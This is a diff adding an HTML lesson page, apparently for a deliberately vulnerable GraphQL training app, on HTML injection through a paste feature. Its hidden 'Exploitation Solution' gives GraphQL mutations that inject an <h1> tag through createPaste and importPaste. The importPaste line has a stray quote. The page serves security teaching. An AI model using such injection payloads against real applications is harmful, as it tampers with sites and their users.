@@ -1,0 +1,33 @@
+<!-- Start -->
+<h3 style="color:purple" id="inj-xss"><b>Injection :: HTML Injection</b></h3>
+<hr />
+<h5>Problem Statement</h5>
+<p>
+  Similarly to the Cross Site Scripting problem, a paste can also include HTML tags that would render in the application, resulting in an HTML injection.
+</p>
+<h5>Resources</h5>
+<ul>
+  <li>
+    <a href="https://www.acunetix.com/blog/web-security-zone/html-injections/" target="_blank">
+      <i class="fa fa-newspaper"></i> Acunetix - HTML Injection
+    </a>
+  </li>
+</ul>
+<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-inj-html')">Show</button></h5>
+<div id="sol-inj-html" style="display:none">
+  <pre class="bash">
+    # Create New Paste allows inserting HTML tags
+    mutation {
+      createPaste(title:"&lt;h1&gt;hello!&lt;/h1&gt;", content:"zzzz", public:true) {
+        pasteId
+      }
+    }
+
+    # Content of HTML_Injection.html 
+    # &lt;h1&gt; Hello &lt;/h1&gt;!
+    mutation {
+      importPaste(host:"localhost", port:80, path:"/HTML_Injection.html"")
+    }
+  </pre>
+</div>
+<!-- End -->
